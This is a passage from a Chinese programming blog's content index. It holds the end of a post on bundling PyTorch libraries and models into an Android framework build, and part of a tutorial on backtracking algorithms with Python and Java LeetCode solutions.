com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:548)</span><br><span class="line">                                                                                                    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:981)</span><br><span class="line">2024-12-17 17:37:22.776  7496-7496  AndroidRuntime          system_process                       D  Shutting down VM</span><br><span class="line">2024-12-17 17:37:22.776  7496-7496  AndroidRuntime          system_process                       E  *** FATAL EXCEPTION IN SYSTEM PROCESS: main</span><br><span class="line">                                                                                                    java.lang.NullPointerException: Attempt to invoke virtual method &#x27;float[][] android.hardware.SystemSensorManager$TensorProcessingTool.processSensorData(float[][])&#x27; on a null object reference</span><br><span class="line">                                                                                                    at android.hardware.SystemSensorManager$SensorEventQueue.dispatchSensorEvent(SystemSensorManager.java:1104)</span><br><span class="line">                                                                                                    at android.os.MessageQueue.nativePollOnce(Native Method)</span><br><span class="line">                                                                                                    at android.os.MessageQueue.next(MessageQueue.java:335)</span><br><span class="line">                                                                                                    at android.os.Looper.loopOnce(Looper.java:161)</span><br><span class="line">                                                                                                    at android.os.Looper.loop(Looper.java:288)</span><br><span class="line">                                                                                                    at com.android.server.SystemServer.run(SystemServer.java:903)</span><br><span class="line">                                                                                                    at com.android.server.SystemServer.main(SystemServer.java:610)</span><br><span class="line">                                                                                                    at java.lang.reflect.Method.invoke(Native Method)</span><br><span class="line">                                                                                                    at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:548)</span><br><span class="line">                                                                                                    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:981)</span><br></pre></td></tr></table></figure><h2 id="正解来了"><a href="#正解来了" class="headerlink" title="正解来了!"></a>正解来了!</h2><p>我尝试了好久都没有成功,发现aar如果带有so的话应该是不能正常加载，所以我就尝试了把aar文件里面的java代码和so分别进行编译<br>主要步骤可以总结为下面的</p><ol><li>对应jar转源码，移除不必要依赖。</li><li>文件夹复制路径 frameworks&#x2F;base&#x2F;core&#x2F;java</li><li>修改Android framework 编译权限文件  旧版本更新update.api,build&#x2F;soong&#x2F;scripts&#x2F;check_boot_jars&#x2F;package_allowed_list.txt 这部分其实第一次就遇到过</li><li>编译源码 添加so ，pt模型文件的编译。在项目device.mk 文件中添加编译命令即可。 但这时候会遇到一个问题，在网上搜索就好 好像是因为android版本比较高所以添加了限制 不让编译so 修改一个配置就好了</li></ol><p>编译添加内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PRODUCT_COPY_FILES += \   </span><br><span class="line">$(LOCAL_PATH)/pytorch/lib/libc++_shared.so:$(TARGET_COPY_OUT_SYSTEM)/lib/libc++_shared.so \  $(LOCAL_PATH)/pytorch/lib64/libc++_shared.so:$(TARGET_COPY_OUT_SYSTEM)/lib64/libc++_shared.so  \</span><br><span class="line">$(LOCAL_PATH)/pytorch/lib/libfbjni.so:$(TARGET_COPY_OUT_SYSTEM)/lib/libfbjni.so \   $(LOCAL_PATH)/pytorch/lib/libpytorch_jni_lite.so:$(TARGET_COPY_OUT_SYSTEM)/lib/libpytorch_jni_lite.so \</span><br><span class="line">$(LOCAL_PATH)/pytorch/lib64/libfbjni.so:$(TARGET_COPY_OUT_SYSTEM)/lib64/libfbjni.so \  $(LOCAL_PATH)/pytorch/lib64/libpytorch_jni_lite.so:$(TARGET_COPY_OUT_SYSTEM)/lib64/libpytorch_jni_lite.so \   $(LOCAL_PATH)/pytorch/cvae1_mobile.pt:$(TARGET_COPY_OUT_SYSTEM)/etc/cvae1_mobile.pt \  $(LOCAL_PATH)/pytorch/DenoiseNet_mobile.pt:$(TARGET_COPY_OUT_SYSTEM)/etc/DenoiseNet_mobile.pt </span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/xjh24778451/article/details/127556958">https://blog.csdn.net/xjh24778451/article/details/127556958</a></p>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【算法】回溯算法</title>
      <link href="/2024/11/29/algorithm/backtracking/"/>
      <url>/2024/11/29/algorithm/backtracking/</url>
      
        <content type="html"><![CDATA[<h2 id="回溯法概况"><a href="#回溯法概况" class="headerlink" title="回溯法概况"></a>回溯法概况</h2><p>回溯法，一般可以解决如下几种问题：</p><ul><li>组合问题：N个数里面按一定规则找出k个数的集合</li><li>切割问题：一个字符串按一定规则有几种切割方式</li><li>子集问题：一个N个数的集合里有多少符合条件的子集</li><li>排列问题：N个数按一定规则全排列，有几种排列方式</li><li>棋盘问题：N皇后，解数独等等</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void backtracking(参数) &#123;</span><br><span class="line">    if (终止条件) &#123;</span><br><span class="line">        存放结果;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for (选择：本层集合中元素（树中节点孩子的数量就是集合的大小）) &#123;</span><br><span class="line">        处理节点;</span><br><span class="line">        backtracking(路径，选择列表); // 递归</span><br><span class="line">        回溯，撤销处理结果</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="startIndex-在回溯中的作用与用法"><a href="#startIndex-在回溯中的作用与用法" class="headerlink" title="startIndex 在回溯中的作用与用法"></a><strong><code>startIndex</code> 在回溯中的作用与用法</strong></h2><p>在 <strong>回溯（Backtracking）</strong> 相关的算法（如 <strong>子集、组合、排列、分割问题</strong>）中，<code>startIndex</code> 的作用非常重要，它决定了递归搜索的范围，影响 <strong>是否允许重复元素</strong> 以及 <strong>是否需要剪枝</strong>。</p><h3 id="1-startIndex-作用"><a href="#1-startIndex-作用" class="headerlink" title="1. startIndex 作用"></a><strong>1. <code>startIndex</code> 作用</strong></h3><h3 id="1-控制搜索范围，避免重复"><a href="#1-控制搜索范围，避免重复" class="headerlink" title="(1) 控制搜索范围，避免重复"></a><strong>(1) 控制搜索范围，避免重复</strong></h3><ul><li><code>startIndex</code> 确保搜索从当前索引或后面的元素开始，<strong>防止回溯时重复选择之前已经选择过的元素</strong>。</li><li><strong>适用于子集、组合问题</strong>，但 <strong>不适用于排列问题</strong>（排列问题允许元素交换顺序）。</li></ul><h4 id="2-递归层次推进"><a href="#2-递归层次推进" class="headerlink" title="(2) 递归层次推进"></a><strong>(2) 递归层次推进</strong></h4><ul><li>递归进入下一层时，<code>startIndex</code> 增加，确保搜索不回头，<strong>保证组合的唯一性</strong>。</li><li><code>startIndex</code> 的值通常是 <code>i + 1</code>，表示当前元素 <code>nums[i]</code> 选中后，下次从 <code>i+1</code> 位置开始搜索。</li></ul><hr><h3 id="2-startIndex-在不同回溯问题中的使用"><a href="#2-startIndex-在不同回溯问题中的使用" class="headerlink" title="2. startIndex 在不同回溯问题中的使用"></a><strong>2. <code>startIndex</code> 在不同回溯问题中的使用</strong></h3><h4 id="1-组合问题（startIndex-需要）"><a href="#1-组合问题（startIndex-需要）" class="headerlink" title="(1) 组合问题（startIndex 需要）"></a><strong>(1) 组合问题（<code>startIndex</code> 需要）</strong></h4><p><strong>问题：从 <code>[1,2,3]</code> 中选出长度为 2 的组合</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">combine</span>(<span class="params">self, nums, k</span>):</span><br><span class="line">        result = []</span><br><span class="line">        <span class="variable language_">self</span>.backtracking(nums, k, <span class="number">0</span>, [], result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, nums, k, startIndex, path, result</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(path) == k:</span><br><span class="line">            result.append(path[:])</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startIndex, <span class="built_in">len</span>(nums)):  <span class="comment"># 关键：从 startIndex 开始</span></span><br><span class="line">            path.append(nums[i])</span><br><span class="line">            <span class="variable language_">self</span>.backtracking(nums, k, i + <span class="number">1</span>, path, result)  <span class="comment"># 递归，i+1 避免重复选择</span></span><br><span class="line">            path.pop()  <span class="comment"># 回溯</span></span><br><span class="line"></span><br><span class="line">sol = Solution()</span><br><span class="line"><span class="built_in">print</span>(sol.combine([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], <span class="number">2</span>))</span><br></pre></td></tr></table></figure><h4 id="📌-startIndex-的作用"><a href="#📌-startIndex-的作用" class="headerlink" title="📌 startIndex 的作用"></a><strong>📌 <code>startIndex</code> 的作用</strong></h4><ul><li><strong>避免重复选择</strong>：<ul><li><code>startIndex</code> 让搜索从 <code>i+1</code> 位置开始，保证组合中的元素不重复使用。</li></ul></li><li><strong>输出结果</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[<span class="number">1</span>,<span class="number">2</span>], [<span class="number">1</span>,<span class="number">3</span>], [<span class="number">2</span>,<span class="number">3</span>]]</span><br></pre></td></tr></table></figure><ul><li>**不会出现 <code>[2,1]</code> 或 <code>[3,1]</code>**，因为 <code>startIndex</code> 控制了搜索方向，确保元素不会向前选择。</li></ul></li></ul><hr><h4 id="2-排列问题（startIndex-不需要）"><a href="#2-排列问题（startIndex-不需要）" class="headerlink" title="(2) 排列问题（startIndex 不需要）"></a><strong>(2) 排列问题（<code>startIndex</code> 不需要）</strong></h4><p><strong>问题：从 <code>[1,2,3]</code> 中选出所有排列</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">permute</span>(<span class="params">self, nums</span>):</span><br><span class="line">        result = []</span><br><span class="line">        <span class="variable language_">self</span>.backtracking(nums, [], result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, nums, path, result</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(path) == <span class="built_in">len</span>(nums):</span><br><span class="line">            result.append(path[:])</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):  <span class="comment"># 关键：不使用 startIndex</span></span><br><span class="line">            <span class="keyword">if</span> nums[i] <span class="keyword">in</span> path:  <span class="comment"># 不能重复使用元素</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            path.append(nums[i])</span><br><span class="line">            <span class="variable language_">self</span>.backtracking(nums, path, result)  <span class="comment"># 递归，没有 startIndex</span></span><br><span class="line">            path.pop()  <span class="comment"># 回溯</span></span><br><span class="line"></span><br><span class="line">sol = Solution()</span><br><span class="line"><span class="built_in">print</span>(sol.permute([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]))</span><br></pre></td></tr></table></figure><h4 id="📌-为什么不用-startIndex"><a href="#📌-为什么不用-startIndex" class="headerlink" title="📌 为什么不用 startIndex"></a><strong>📌 为什么不用 <code>startIndex</code></strong></h4><ul><li><p><strong>排列问题允许元素交换顺序</strong>，所以不需要 <code>startIndex</code> 来限制搜索方向。</p></li><li><p>但仍然需要 <code>if nums[i] in path:</code> 这个条件，<strong>避免重复选择相同元素</strong>。</p></li><li><p><strong>输出结果</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], [<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>], [<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>], [<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>], [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>], [<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>]]</span><br></pre></td></tr></table></figure><ul><li>这里 <code>2,1</code> 也出现了，说明 <code>startIndex</code> 没有限制排列顺序。</li></ul></li></ul><hr><h4 id="3-子集问题（startIndex-控制唯一性）"><a href="#3-子集问题（startIndex-控制唯一性）" class="headerlink" title="(3) 子集问题（startIndex 控制唯一性）"></a><strong>(3) 子集问题（<code>startIndex</code> 控制唯一性）</strong></h4><p><strong>问题：求 <code>[1,2,3]</code> 的所有子集</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subsets</span>(<span class="params">self, nums</span>):</span><br><span class="line">        result = []</span><br><span class="line">        <span class="variable language_">self</span>.backtracking(nums, <span class="number">0</span>, [], result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, nums, startIndex, path, result</span>):</span><br><span class="line">        result.append(path[:])  <span class="comment"># 子集问题可以随时收集结果</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(startIndex, <span class="built_in">len</span>(nums)):  <span class="comment"># 关键：避免重复选择</span></span><br><span class="line">            path.append(nums[i])</span><br><span class="line">            <span class="variable language_">self</span>.backtracking(nums, i + <span class="number">1</span>, path, result)</span><br><span class="line">            path.pop()  <span class="comment"># 回溯</span></span><br><span class="line"></span><br><span class="line">sol = Solution()</span><br><span class="line"><span class="built_in">print</span>(sol.subsets([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]))</span><br></pre></td></tr></table></figure><h4 id="📌-startIndex-作用"><a href="#📌-startIndex-作用" class="headerlink" title="📌 startIndex 作用"></a><strong>📌 <code>startIndex</code> 作用</strong></h4><ul><li><strong>保证子集中的元素不重复</strong></li><li><strong>避免 <code>[2,1]</code> 这样的情况出现</strong></li><li><strong>输出结果</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[], [<span class="number">1</span>], [<span class="number">1</span>,<span class="number">2</span>], [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], [<span class="number">1</span>,<span class="number">3</span>], [<span class="number">2</span>], [<span class="number">2</span>,<span class="number">3</span>], [<span class="number">3</span>]]</span><br></pre></td></tr></table></figure></li></ul><hr><h3 id="3-startIndex-总结"><a href="#3-startIndex-总结" class="headerlink" title="3. startIndex 总结"></a><strong>3. <code>startIndex</code> 总结</strong></h3><table><thead><tr><th>问题</th><th><code>startIndex</code> 是否需要</th><th>作用</th></tr></thead><tbody><tr><td><strong>组合（Combination）</strong></td><td>✅ 需要</td><td>避免重复选择，控制搜索范围</td></tr><tr><td><strong>排列（Permutation）</strong></td><td>❌ 不需要</td><td>排列允许交换顺序，不限制搜索方向</td></tr><tr><td><strong>子集（Subsets）</strong></td><td>✅ 需要</td><td>避免重复选择，控制唯一性</td></tr><tr><td><strong>回文分割（Palindrome Partitioning）</strong></td><td>✅ 需要</td><td>控制切割点，避免重复分割</td></tr></tbody></table><h4 id="🚀-记住这条规则"><a href="#🚀-记住这条规则" class="headerlink" title="🚀 记住这条规则"></a><strong>🚀 记住这条规则</strong></h4><ul><li><strong>如果问题允许元素交换顺序（如排列） → <code>startIndex</code> <strong>不需要</strong>。</strong></li><li><strong>如果问题需要保证元素顺序（如组合、子集） → <code>startIndex</code> <strong>需要</strong>。</strong></li><li><strong>如果是分割问题（如回文分割） → <code>startIndex</code> 也需要，控制切割点。</strong></li></ul><hr><h3 id="4-startIndex-与-used-数组的区别"><a href="#4-startIndex-与-used-数组的区别" class="headerlink" title="4. startIndex 与 used 数组的区别"></a><strong>4. <code>startIndex</code> 与 <code>used</code> 数组的区别</strong></h3><p>有时候，在排列问题中，我们会用 <code>used</code> 数组代替 <code>startIndex</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">used = [<span class="literal">False</span>] * <span class="built_in">len</span>(nums)</span><br></pre></td></tr></table></figure><ul><li><strong><code>startIndex</code> 作用</strong> → 限制搜索范围，<strong>保证递增、不重复选择</strong>（用于组合、子集）。</li><li><strong><code>used</code> 作用</strong> → 记录某个元素是否被用过，<strong>避免同层重复选择</strong>（用于排列、含重复元素的组合）。</li></ul><p><strong>例子：含重复元素的排列</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">permuteUnique</span>(<span class="params">self, nums</span>):</span><br><span class="line">        result = []</span><br><span class="line">        used = [<span class="literal">False</span>] * <span class="built_in">len</span>(nums)</span><br><span class="line">        nums.sort()  <span class="comment"># 排序，方便去重</span></span><br><span class="line">        <span class="variable language_">self</span>.backtracking(nums, [], used, result)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">backtracking</span>(<span class="params">self, nums, path, used, result</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(path) == <span class="built_in">len</span>(nums):</span><br><span class="line">            result.append(path[:])</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">if</span> used[i]:  <span class="comment"># 这个元素已经被选过</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> nums[i] == nums[i - <span class="number">1</span>] <span class="keyword">and</span> <span class="keyword">not</span> used[i - <span class="number">1</span>]:  <span class="comment"># 避免同层重复</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            used[i] = <span class="literal">True</span></span><br><span class="line">            path.append(nums[i])</span><br><span class="line">            <span class="variable language_">self</span>.backtracking(nums, path, used, result)</span><br><span class="line">            path.pop()</span><br><span class="line">            used[i] = <span class="literal">False</span>  <span class="comment"># 回溯，撤销选择</span></span><br></pre></td></tr></table></figure><h2 id="77-组合"><a href="#77-组合" class="headerlink" title="77. 组合"></a>77. 组合</h2><p>给定两个整数 n 和 k，返回范围 [1, n] 中所有可能的 k 个数的组合。<br>你可以按 任何顺序 返回答案。</p><p>直接想到的是for循环嵌套,但是如果k很大的话就会需要很多个for循环进行嵌套,这显然是不可能的,所以需要用到回溯算法.<br>递归来做层叠嵌套（可以理解是开k层for循环），每一次的递归中嵌套一个for循环，那么递归就可以用于解决多层嵌套循环的问题了。<br><img src="/2024/11/29/algorithm/backtracking/image.png" alt="组合问题可以抽象为树问题"><br>但是回溯过程可以进行剪枝优化,如下图,n &#x3D; 4，k &#x3D; 4的话，那么第一层for循环的时候，从元素2开始的遍历都没有意义了。 在第二层for循环，从元素3开始的遍历都没有意义了。<br><img src="/2024/11/29/algorithm/backtracking/image-1.png"><br>优化过程如下：<br>已经选择的元素个数：path.size();<br>还需要的元素个数为: k - path.size();<br>在集合n中至多要从该起始位置 : n - (k - path.size()) + 1，开始遍历<br>为什么有个+1呢，因为包括起始位置，我们要是一个左闭的集合。<br>举个例子，n &#x3D; 4，k &#x3D; 3， 目前已经选取的元素为0（path.size为0），n - (k - 0) + 1 即 4 - ( 3 - 0) + 1 &#x3D; 2。<br>从2开始搜索都是合理的，可以是组合[2, 3, 4]。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    LinkedList&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combine</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        backtracking(n, k, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtracking</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> k, <span class="type">int</span> startIndex)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(path.size() == k)&#123;</span><br><span class="line">            result.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt;= n - (k - path.size()) + <span class="number">1</span>; i++)&#123;</span><br><span class="line">            path.add(i);</span><br><span class="line">            backtracking(n, k, i+<span class="number">1</span>);</span><br><span class="line">            path.removeLast();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="216-组合总和-III"><a href="#216-组合总和-III" class="headerlink" title="216. 组合总和 III"></a>216. 组合总和 III</h2><p>找出所有相加之和为 n 的 k 个数的组合，且满足下列条件：</p><p>只使用数字1到9<br>每个数字 最多使用一次<br>返回 所有可能的有效组合的列表 。该列表不能包含相同的组合两次，组合可以以任何顺序返回。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    LinkedList&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum3</span><span class="params">(<span class="type">int</span> k, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        backTracking(n, k, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">backTracking</span><span class="params">(<span class="type">int</span> targetSum, <span class="type">int</span> k, <span class="type">int</span> startIndex, <span class="type">int</span> sum)</span>&#123;</span><br><span class="line">        <span class="comment">// 剪枝</span></span><br><span class="line">        <span class="keyword">if</span>(sum &gt; targetSum)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(path.size() == k)&#123;</span><br><span class="line">            <span class="keyword">if</span>(sum == targetSum) result.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 剪枝 9 - (k - path.size()) + 1</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> startIndex; i &lt;= <span class="number">9</span> - (k - path.size())+<span class="number">1</span>; i++)&#123;</span><br><span class="line">            path.add(i);</span><br><span class="line">            sum += i;</span><br><span class="line">            backTracking(targetSum, k, i+<span class="number">1</span>, sum);</span><br><span class="line">            path.removeLast();</span><br><span class="line">            sum -= i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="17-电话号码的字母组合"><a href="#17-电话号码的字母组合" class="headerlink" title="17.电话号码的字母组合"></a>17.电话号码的字母组合</h2><p>给定一个仅包含数字 2-9 的字符串，返回所有它能表示的字母组合。答案可以按 任意顺序 返回。</p><p>给出数字到字母的映射如下（与电话按键相同）。注意 1 不对应任何字母。<br><img src="/2024/11/29/algorithm/backtracking/image-2.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">letterCombinations</span><span class="params">(String digits)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(digits == <span class="literal">null</span> || digits.length() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String[] numString = &#123;<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;abc&quot;</span>,<span class="string">&quot;def&quot;</span>, <span class="string">&quot;ghi&quot;</span>, <span class="string">&quot;jkl&quot;</span>, <span class="string">&quot;mno&quot;</span>, <span class="string">&quot;pqrs&quot;</span>, <span class="string">&quot;tuv&quot;</span>, <span class="string">&quot;wxyz&quot;</span>&#125;;</span><br><span class="line">        backTracking(digits, numString, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">StringBuilder</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span 